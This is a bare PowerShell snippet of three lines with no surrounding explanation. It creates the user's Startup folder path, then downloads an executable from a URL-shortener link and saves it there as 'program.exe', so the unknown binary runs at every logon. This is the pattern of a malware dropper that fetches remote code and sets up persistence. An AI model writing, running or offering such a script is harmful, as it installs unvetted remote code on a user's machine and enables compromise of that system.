$p = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
New-Item -ItemType Directory -Path $p -Force
Invoke-WebRequest -Uri "https://tinyurl.com/4as6f22p" -OutFile "$p\program.exe"
